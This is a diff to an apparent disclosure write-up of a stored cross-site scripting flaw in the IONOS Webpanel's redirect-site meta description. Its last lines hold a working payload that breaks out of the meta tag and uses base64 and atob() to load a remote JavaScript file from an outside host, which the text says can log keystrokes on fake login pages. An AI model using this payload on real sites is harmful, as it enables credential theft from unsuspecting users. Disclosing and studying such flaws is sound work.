@@ -4,9 +4,13 @@
 ## The Exploit
 
 IONOS Webpanel did not santitise or parse any HTML written into the "Short Description" meta tag for redirect sites. This allowed an attacked to inject malicious javascript into a site which could then execute external javascript pulled from any other server. 
+
 ![IONOS Web Panel](https://i.imgur.com/KRsu6ab.png)
+
 This exploit allowed an attacked to run any javascript they wanted on a page where other pages were loaded in as an Iframe. This means they could fool a user into thinking they were logging into a legitimate service, when the attacker has malicious javascript logging keyboard input.
+
 ![Firefox Developer tools showing JS has been injected to the site.](https://i.imgur.com/OxgeoaI.png)
+
 The interesting thing was that the IONOS web panel **DID** check for links!  But this could be easily circumvented via obfuscation with base64, using js to deobfuscate the B64 back into a url and inject it into the page programatically. The code to do so was:
 ```js
 **"/><script id="j"></script><script id="f"></script><script id="c"></script><script>document.getElementById("c").setAttribute("src",atob("aHR0cHM6Ly9yYXcuZ2l0aGFjay5jb20vVGlrdmFoVGVybWluYXRvci9KU1BheWxvYWQvbWFzdGVyL3BheWxvYWQuanM=");</script><meta name="**
